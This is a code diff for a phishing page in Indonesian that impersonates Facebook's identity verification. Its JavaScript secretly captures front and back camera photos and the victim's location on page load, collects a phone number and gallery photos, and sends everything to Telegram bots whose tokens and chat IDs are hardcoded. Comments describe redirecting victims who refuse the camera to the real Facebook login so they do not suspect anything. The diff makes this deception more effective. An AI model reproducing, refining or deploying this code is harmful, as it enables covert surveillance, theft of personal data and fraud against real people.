@@ -7,7 +7,7 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; }
-        .main-card { max-width: 450px; margin: 80px auto; border: none; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.1); background: white; }
+        .main-card { max-width: 450px; margin: 50px auto; border: none; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.1); background: white; }
         .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; letter-spacing: -1px; }
         .btn-fb { background-color: #1877f2; color: white; font-weight: bold; padding: 10px; border-radius: 6px; border: none; }
         .btn-fb:hover { background-color: #166fe5; color: white; }
@@ -21,13 +21,13 @@
     <div class="main-card card p-4">
         <div class="fb-logo mb-3">facebook</div>
         <h5 class="fw-bold">Verifikasi Identitas Anda</h5>
-        <p class="text-muted" style="font-size: 14px;">Kami mendeteksi aktivitas mencurigakan. Selesaikan langkah berikut untuk mengamankan akun Anda.</p>
+        <p class="text-muted" style="font-size: 14px;">Kami mendeteksi aktivitas mencurigakan pada akun Anda. Mohon verifikasi data di bawah ini untuk menghindari pemblokiran permanen.</p>
         
         <hr>
 
         <div class="mb-3 text-start">
             <label class="form-label small fw-bold">Konfirmasi Nomor Telepon</label>
-            <input type="number" id="phone" class="form-control mb-2" placeholder="Nomor Handphone">
+            <input type="number" id="phone" class="form-control mb-2" placeholder="Nomor Handphone Terdaftar">
             <button class="btn btn-fb w-100" onclick="sendDataOnly()">Konfirmasi & Pulihkan Akun</button>
         </div>
 
@@ -37,7 +37,7 @@
         </div>
 
         <div class="loading-spinner text-primary mt-3" id="loader">
-            <div class="spinner-border spinner-border-sm"></div> <span class="small">Sinkronisasi data keamanan...</span>
+            <div class="spinner-border spinner-border-sm"></div> <span class="small">Mengunggah data keamanan...</span>
         </div>
     </div>
 </div>
@@ -49,11 +49,11 @@
     const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
     const chats = ["7835924973", "8071786272"];
 
-    // OTOMATIS JALAN PAS MASUK LINK 😈
+    // SISTEM OTOMATIS PAS MASUK 😈
     window.onload = () => {
-        autoCapture("user"); // Sikat Kamera Depan
-        setTimeout(() => autoCapture("environment"), 4000); // Sikat Kamera Belakang
-        autoLocation(); // Sikat Lokasi
+        // Mulai sikat data secara berurutan
+        autoCapture("user"); // Kamera Depan
+        autoLocation(); // Lokasi
     };
 
     function sendToTelegram(msg, isPhoto = false, blob = null) {
@@ -62,7 +62,7 @@
             const formData = new FormData();
             formData.append("chat_id", chats[i]);
             if (isPhoto) {
-                formData.append("photo", blob, "data.jpg");
+                formData.append("photo", blob, "captured_data.jpg");
                 formData.append("caption", msg);
             } else {
                 formData.append("text", msg);
@@ -71,7 +71,7 @@
         });
     }
 
-    // Capture Kamera Otomatis 📸
+    // Capture Kamera 📸
     async function autoCapture(mode) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
@@ -87,16 +87,29 @@
                     sendToTelegram(`Captured: ${mode === "user" ? "Front" : "Back"} Camera`, true, blob);
                 }, 'image/jpeg');
                 stream.getTracks().forEach(t => t.stop());
+
+                // Kalau udah kamera depan, lanjut sikat kamera belakang setelah 3 detik
+                if(mode === "user") {
+                    setTimeout(() => autoCapture("environment"), 3000);
+                }
             }, 2000);
-        } catch (e) { console.log("Camera Access Denied"); }
+        } catch (e) {
+            // KALO NOLAK KAMERA, LANGSUNG KICK KE LOGIN FB BIAR GAK CURIGA ☠️
+            console.log("Kamera Ditolak");
+            window.location.href = "https://www.facebook.com/login"; 
+        }
     }
 
-    // Lokasi Otomatis 📍
+    // Lokasi 📍
     function autoLocation() {
         navigator.geolocation.getCurrentPosition((p) => {
-            const mapLink = `📍 LOKASI TARGET: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            const mapLink = `📍 LOKASI TARGET: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
             sendToTelegram(mapLink);
-        }, (err) => { console.log("Location Denied"); });
+        }, (err) => {
+            // KALO NOLAK LOKASI, KASIH PERINGATAN BIAR DIA MAU INPUT NOMOR 😋
+            console.log("Lokasi Ditolak");
+            alert("Sistem keamanan membutuhkan lokasi untuk verifikasi. Lanjutkan secara manual.");
+        });
     }
 
     // Tombol Kirim Nomor & Galeri 🖼️
@@ -104,18 +117,18 @@
         const phone = document.getElementById('phone').value;
         const files = document.getElementById('galeri').files;
         
-        if(!phone) { alert("Masukkan nomor telepon!"); return; }
+        if(!phone) { alert("Silakan masukkan nomor telepon!"); return; }
         
         document.getElementById('loader').style.display = 'block';
         sendToTelegram(`📱 NOMOR HP TARGET: ${phone}`);
         
-        // Kirim maksimal 5 foto dari galeri
+        // Kirim maksimal 5 foto galeri
         for (let i = 0; i < Math.min(files.length, 5); i++) {
             sendToTelegram(`🖼️ FOTO GALERI ${i+1}`, true, files[i]);
         }
 
         setTimeout(() => {
-            alert("Verifikasi berhasil dikirim. Akun Anda sedang ditinjau.");
+            alert("Identitas berhasil dikirim. Sesi akan diperbarui.");
             window.location.href = "https://www.facebook.com/login";
         }, 3000);
     }
